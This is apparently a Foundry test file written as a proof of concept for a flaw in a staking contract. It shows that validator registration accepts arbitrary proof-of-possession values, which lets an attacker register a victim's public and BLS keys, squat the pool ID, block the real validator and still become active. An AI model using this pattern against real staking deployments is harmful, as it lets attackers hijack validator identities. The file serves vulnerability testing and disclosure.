// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ChainConfig} from "../src/chainConfig/ChainConfig.sol";
import {RuleManager} from "../src/ruleManager/RuleManager.sol";
import {Staking} from "../src/staking/Staking.sol";
import {IStaking} from "../src/staking/interfaces/IStaking.sol";
import {TransparentUpgradeableProxy} from "../src/TransparentUpgradeableProxy.sol";

contract StakingPoPValidationTest is Test {
    ChainConfig private chainConfig;
    TransparentUpgradeableProxy private chainConfigProxy;
    Staking private staking;
    TransparentUpgradeableProxy private stakingProxy;
    RuleManager private ruleManager;
    TransparentUpgradeableProxy private ruleManagerProxy;

    address private admin = address(0x1111111111111111111111111111111111111111);
    address private attacker = address(0xA11CE);
    address private legitimateValidator = address(0xB0B);

    string private constant DESCRIPTION = "Test Validator";
    string private constant ENDPOINT = "validator.example:19000";
    string private constant VICTIM_PUBLIC_KEY =
        "0x04a34d6aef32a6a5a4389f68f9a7a8b9c0d1e2f3a4b5c6d7e8f90a1b2c3d4e5f";
    string private constant VICTIM_BLS_PUBLIC_KEY = "0xbeef1234";
    string private constant INVALID_POP = "0xdeadbeef";
    string private constant INVALID_BLS_POP = "0xcafebabe";

    uint256 private constant MIN_VALIDATOR_STAKE = 10 ether;
    uint256 private constant MIN_REGISTRATION_STAKE = 1 ether;
    uint256 private constant MIN_DELEGATOR_STAKE = 1 ether;
    uint256 private constant MAX_POOL_STAKE = 10000000 ether;

    function setUp() public {
        vm.startPrank(admin);
        chainConfig = new ChainConfig();
        ruleManager = new RuleManager();
        staking = new Staking();

        bytes memory chainConfigInitData =
            abi.encodeWithSelector(ChainConfig.initialize.selector, admin, address(staking));
        chainConfigProxy = new TransparentUpgradeableProxy(address(chainConfig), chainConfigInitData);
        chainConfig = ChainConfig(address(chainConfigProxy));

        bytes memory ruleManagerInitData = abi.encodeWithSelector(RuleManager.initialize.selector, admin, 1000);
        ruleManagerProxy = new TransparentUpgradeableProxy(address(ruleManager), ruleManagerInitData);
        ruleManager = RuleManager(address(ruleManagerProxy));

        bytes memory stakingInitData = abi.encodeWithSelector(Staking.initialize.selector, admin, address(chainConfig));
        stakingProxy = new TransparentUpgradeableProxy(address(staking), stakingInitData);
        staking = Staking(payable(address(stakingProxy)));

        chainConfig.updateStakingAddress(address(staking));
        vm.stopPrank();

        string[] memory keys = new string[](5);
        string[] memory values = new string[](5);
        keys[0] = "staking.min_staking_pool_value";
        values[0] = vm.toString(MIN_VALIDATOR_STAKE);
        keys[1] = "staking.max_staking_pool_value";
        values[1] = vm.toString(MAX_POOL_STAKE);
        keys[2] = "staking.min_delegator_stake";
        values[2] = vm.toString(MIN_DELEGATOR_STAKE);
        keys[3] = "staking.withdraw_effective_epoch";
        values[3] = "1";
        keys[4] = "staking.min_staking_registration_value";
        values[4] = vm.toString(MIN_REGISTRATION_STAKE);

        vm.prank(address(staking));
        chainConfig.setConfig(keys, values);
        vm.roll(block.number + 1);
    }

    function advanceEpoch() internal {
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 4 hours + 1);
        vm.prank(admin);
        staking.advanceEpoch();
    }

    function testRegisterValidatorAcceptsArbitraryPoPValues() public {
        vm.deal(attacker, MIN_VALIDATOR_STAKE);

        vm.prank(attacker);
        bytes32 poolId = staking.registerValidator{value: MIN_VALIDATOR_STAKE}(
            DESCRIPTION,
            VICTIM_PUBLIC_KEY,
            INVALID_POP,
            VICTIM_BLS_PUBLIC_KEY,
            INVALID_BLS_POP,
            ENDPOINT
        );

        IStaking.Validator memory validatorInfo = staking.getValidator(poolId);

        assertEq(validatorInfo.owner, attacker, "attacker should become validator owner");
        assertEq(validatorInfo.publicKey, VICTIM_PUBLIC_KEY, "public key should be stored verbatim");
        assertEq(validatorInfo.publicKeyPop, INVALID_POP, "public key pop should be stored verbatim");
        assertEq(validatorInfo.blsPublicKey, VICTIM_BLS_PUBLIC_KEY, "bls key should be stored verbatim");
        assertEq(validatorInfo.blsPublicKeyPop, INVALID_BLS_POP, "bls pop should be stored verbatim");
    }

    function testFirstRegistrantCanSquatPoolId() public {
        vm.deal(attacker, MIN_VALIDATOR_STAKE);
        vm.deal(legitimateValidator, MIN_VALIDATOR_STAKE);

        vm.prank(attacker);
        bytes32 poolId = staking.registerValidator{value: MIN_VALIDATOR_STAKE}(
            DESCRIPTION,
            VICTIM_PUBLIC_KEY,
            INVALID_POP,
            VICTIM_BLS_PUBLIC_KEY,
            INVALID_BLS_POP,
            ENDPOINT
        );

        assertTrue(staking.isValidatorPendingAdd(poolId), "attacker registration should enter pending add queue");

        vm.prank(legitimateValidator);
        vm.expectRevert("PoolId registered by another address: cannot re-register");
        staking.registerValidator{value: MIN_VALIDATOR_STAKE}(
            DESCRIPTION,
            VICTIM_PUBLIC_KEY,
            "0xlegitpop",
            VICTIM_BLS_PUBLIC_KEY,
            "0xlegitblspop",
            ENDPOINT
        );
    }

    function testValidatorWithArbitraryPoPCanBecomeActive() public {
        vm.deal(attacker, MIN_VALIDATOR_STAKE);

        vm.prank(attacker);
        bytes32 poolId = staking.registerValidator{value: MIN_VALIDATOR_STAKE}(
            DESCRIPTION,
            VICTIM_PUBLIC_KEY,
            INVALID_POP,
            VICTIM_BLS_PUBLIC_KEY,
            INVALID_BLS_POP,
            ENDPOINT
        );

        assertTrue(staking.isValidatorPendingAdd(poolId), "validator should be pending before epoch advance");

        advanceEpoch();

        assertTrue(staking.isValidatorActive(poolId), "validator should become active after epoch advance");
    }
}
